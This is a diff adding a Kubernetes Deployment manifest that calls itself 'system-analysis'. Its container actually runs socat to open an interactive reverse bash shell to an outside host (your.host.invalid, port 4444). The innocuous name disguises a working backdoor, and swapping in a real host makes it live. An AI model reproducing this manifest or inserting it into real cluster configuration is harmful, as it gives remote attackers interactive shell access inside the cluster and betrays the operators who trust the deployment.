@@ -1,0 +1,21 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: system-analysis
+  labels:
+    app: sa
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: sa
+  template:
+    metadata:
+      labels:
+        app: sa
+    spec:
+      containers:
+      - name: sa
+        image: uchimata/system-analysis
+        command: ["socat"]
+        args: ["exec:'bash -li',pty,stderr,setsid,sigint,sane", "tcp:your.host.invalid:4444"]
